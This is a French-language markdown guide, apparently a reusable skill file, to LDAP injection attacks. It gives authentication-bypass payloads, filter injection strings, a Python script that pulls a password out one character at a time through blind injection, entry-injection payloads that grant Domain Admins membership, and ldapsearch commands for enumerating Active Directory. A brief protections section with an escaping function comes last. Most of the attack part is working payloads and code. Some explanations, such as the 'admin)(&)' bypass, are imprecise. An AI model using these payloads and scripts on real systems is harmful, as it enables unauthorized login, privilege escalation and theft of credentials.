---
name: ldap-injection
description: Guide complet d'attaques LDAP Injection — blind LDAP injection, authentication bypass, LDAP search filter injection, outils et payloads.
category: cybersecurite
tags: [ldap, injection, authentication, directory-services, active-directory, openldap]
---

# Attaques LDAP Injection

## Sommaire
1. [Concepts LDAP](#concepts-ldap)
2. [Types d'Injections LDAP](#types-dinjections-ldap)
3. [Authentication Bypass](#authentication-bypass)
4. [LDAP Search Filter Injection](#ldap-search-filter-injection)
5. [Blind LDAP Injection](#blind-ldap-injection)
6. [LDAP Entry Injection](#ldap-entry-injection)
7. [Attaques Spécifiques AD](#attaques-specifiques-ad)
8. [Outils et Scripts](#outils-et-scripts)

## Concepts LDAP

LDAP (Lightweight Directory Access Protocol) est utilisé pour l'authentification
et l'accès aux annuaires (Active Directory, OpenLDAP, FreeIPA).

### Structure de base :
```
DN (Distinguished Name) : cn=admin,ou=users,dc=company,dc=com
RDN (Relative DN) : cn=admin
Base DN : dc=company,dc=com
Attributs : cn, sn, uid, mail, userPassword, memberOf
```

### Filtres LDAP courants :
```
(&(uid=user)(userPassword=pass))   → AND
(|(uid=user)(mail=user@test.com)) → OR
(!(uid=admin))                     → NOT
(uid=*)                            → Wildcard
(objectClass=*)                    → Tous les objets
```

## Types d'Injections LDAP

LDAP Injection exploite l'absence d'échappement des entrées utilisateur
dans les filtres LDAP.

### Syntaxe d'injection :
```
Caractères dangereux : ( ) & | ! = ~ < > , ; " * % 
Échappement LDAP : \28 \29 \2a \5c
```

## Authentication Bypass

### Bypass de login basique :
```
Filtre original : (&(uid=INPUT)(userPassword=INPUT))
Payload : uid=*)(uid=*))(|(uid=*
Résultat : (&(uid=*)(uid=*))(|(uid=*)(userPassword=INPUT))
Le filtre devient : (&(uid=*)(uid=*))  → TOUJOURS VRAI
```

### Autres payloads auth bypass :
```
# Bypass simple
username=*&password=*
# Résultat : (&(uid=*)(userPassword=*)) → TOUJOURS VRAI

# Bypass avec fermeture
username=admin)(&)&password=whatever
# Résultat : (&(uid=admin)(&))(userPassword=whatever))
# La partie (uid=admin)(&) est valide, le (userPassword=whatever) est ignoré

# Bypass avec OR
username=*)(uid=*))(|(uid=*&password=*
# Résultat : (&(uid=*)(uid=*))(|(uid=*)(userPassword=*))
```

## LDAP Search Filter Injection

### Extraction d'attributs :
```
URL originale : https://target.com/search?user=john

Injection :
?user=john)(uid=*
→ Filtre : (&(cn=john)(uid=*))  → retourne tous les utilisateurs

?user=john)(mail=*
→ Filtre : (&(cn=john)(mail=*))  → retourne si john a un mail

?user=john)(objectClass=*)
→ Filtre : (&(cn=john)(objectClass=*))  → retourne tout ce qui est john
```

### Extraction par caractères (AND) :
```
?user=admin)(userPassword=a*
→ Si réponse "utilisateur trouvé" → password commence par 'a'

?user=admin)(userPassword=b*
→ Si "non trouvé" → pas de 'b'

?user=admin)(userPassword=a*
→ Continuer : a*, aa*, aaa*, aaab*, etc.
```

### Extraction par exclusion (NOT/OR) :
```
?user=admin)(!(userPassword=a*)
→ Si "non trouvé" → password commence par 'a'
→ Si "trouvé" → password ne commence pas par 'a'
```

## Blind LDAP Injection

Quand la réponse ne montre pas les données mais seulement une présence/absence.

### Technique AND (booléen) :
```
# Original : https://target.com/user?name=john
# Réponse "OK" si trouvé, "404" si non trouvé

# Tester l'injection
name=john)(uid=*)
→ Si OK → injection confirmée

# Tester caractère par caractère
name=admin)(userPassword=a*)
→ OK → password starts with 'a'
name=admin)(userPassword=b*)
→ 404 → not 'b'...
```

### Script d'extraction blind LDAP :
```python
import requests
import string

def blind_ldap_extract(url, base_dn="dc=company,dc=com"):
    """Extraire le password par blind LDAP injection"""
    charset = string.ascii_lowercase + string.digits + "_{}"
    extracted = ""
    
    for pos in range(32):
        found = False
        for c in charset:
            # Payload pour tester le caractère
            payload = f"admin)(userPassword={extracted}{c}*)"
            r = requests.get(url, params={"user": payload})
            
            if "OK" in r.text or "found" in r.text.lower():
                extracted += c
                print(f"[+] Position {pos}: '{c}' → password: {extracted}")
                found = True
                break
        
        if not found:
            break
    
    return extracted
```

### Time-based LDAP injection :
Pour les cas où il n'y a pas de retour booléen, utiliser des opérations coûteuses.

## LDAP Entry Injection

Injection dans des champs qui modifient l'annuaire (LDAP modify/add).

### Injection dans un attribut :
```
Payload : cn=admin, ou=evil
Résultat : ajoute/modifie l'attribut avec une valeur malveillante

Payload : memberOf=cn=Domain Admins, cn=users, dc=company, dc=com
Résultat : élévation de privilèges (si non validé)
```

### Mass modification :
```
Payload : (|(cn=*)(description=*))
→ Modifie tous les objets matchant le filtre
```

## Attaques Spécifiques AD

### Découverte d'utilisateurs AD via LDAP :
```bash
# Avec ldapsearch
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" \
  "(objectClass=user)" sAMAccountName

# Avec ADSI (PowerShell)
([ADSI]"LDAP://dc=company,dc=com").psbase.Children
```

### Énumération des groupes :
```bash
# Lister les groupes
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" \
  "(objectClass=group)" cn member

# Chercher les admins
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=company,DC=com)" cn
```

### Exploitation AD avec injection :
```
# Si un champ est injectable dans le filtre LDAP d'AD
# Chercher tous les utilisateurs avec un SPN (Kerberoastable)
payload=*)(servicePrincipalName=*)(cn=*
```

## Outils et Scripts

### ldapsearch :
```bash
# Test d'injection basique
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" \
  "'" 2>&1 | grep -i error

# Si erreur → injection possible

# Énumération complète
ldapsearch -x -H ldap://target.com -b "dc=company,dc=com" \
  "(|(cn=*)(uid=*))" cn uid mail
```

### Script Python d'exploitation :
```python
import ldap3

def ldap_injection_test(server, base_dn, username):
    """Tester l'injection LDAP sur un formulaire de login"""
    conn = ldap3.Connection(server)
    
    # Test de bypass
    test_payloads = [
        "*",
        "*))(|(uid=*",
        "admin)(&)",
        "*)(uid=*))(|(uid=*",
        "*)(|(uid=*",
        "*))(|(uid=*",
    ]
    
    for payload in test_payloads:
        search_filter = f"(&(uid={payload})(userPassword=test))"
        try:
            conn.search(base_dn, search_filter)
            if len(conn.entries) > 0:
                print(f"[+] Bypass possible avec: {payload}")
        except:
            pass

def extract_entries(url, base_dn):
    """Extraire toutes les entrées via injection"""
    # AND blind injection
    conn = ldap3.Connection(url)
    extracted = {}
    
    # Découvrir les attributs
    conn.search(base_dn, "(objectClass=*)", attributes=['*'])
    for entry in conn.entries:
        print(f"DN: {entry.entry_dn}")
        for attr in entry.entry_attributes:
            print(f"  {attr}: {entry[attr]}")
```

### JXplorer (GUI LDAP browser) :
```bash
# Interface graphique pour explorer LDAP
# Utile pour visualiser la structure
java -jar JXplorer.jar
```

### Tools for LDAP testing :
```bash
# ldapsearch (OpenLDAP clients)
# JXplorer
# Apache Directory Studio
# Softerra LDAP Browser (gratuit pour analyse)
```

## Protections
- **Échappement systématique** des entrées utilisateur (`\28`, `\29`, etc.)
- **Validation stricte** des caractères autorisés (whitelist, pas blacklist)
- **LDAP parameterized queries** (si supporté)
- **Least privilege** : le compte LDAP utilisé ne doit pas pouvoir lister/modifier
- **Rate limiting** sur les requêtes LDAP
- **Journalisation** des échecs d'authentification LDAP
- **WAF** avec règles spécifiques LDAP

### Exemple d'échappement sécurisé :
```python
import re

def escape_ldap_filter(value):
    """Échapper les caractères dangereux pour un filtre LDAP"""
    dangerous = {
        '\\': '\\5c',
        '*': '\\2a',
        '(': '\\28',
        ')': '\\29',
        '\0': '\\00',
    }
    for char, escape in dangerous.items():
        value = value.replace(char, escape)
    return value

# Usage sécurisé
search_filter = f"(&(uid={escape_ldap_filter(user_input)})(objectClass=user))"
```

## Ressources
- **HackTricks LDAP Injection** : https://book.hacktricks.xyz/pentesting-web/ldap-injection
- **OWASP LDAP Injection** : https://owasp.org/www-community/attacks/LDAP_Injection
- **PayloadsAllTheThings LDAP** : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- **ldapsearch man page** : https://man.openldap.org/software/man.cgi?query=ldapsearch
- **BlackHat LDAP Injection Paper** : https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf